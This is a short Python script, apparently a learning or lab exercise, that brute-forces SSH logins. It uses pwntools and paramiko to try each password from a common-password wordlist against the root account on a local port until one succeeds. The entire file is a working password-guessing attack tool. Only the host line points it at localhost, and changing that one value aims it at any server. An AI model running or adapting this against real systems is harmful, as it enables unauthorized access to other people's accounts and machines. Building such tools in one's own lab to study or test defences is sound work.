#SSH Brute Forcer

#pwn tools calls paramiko
from urllib import response
from pwn import *
#SSH python module
import paramiko
from pwnlib import timeout

host = "127.0.0.1"
username = "root"
attempts = 0
port = 4242

with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print(("[{}] Attempting password: '{}'!".format(attempts, password)))
            response = ssh(host=host, user=username, password=password, timeout=1, port=port, key=None, keyfile=None)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1

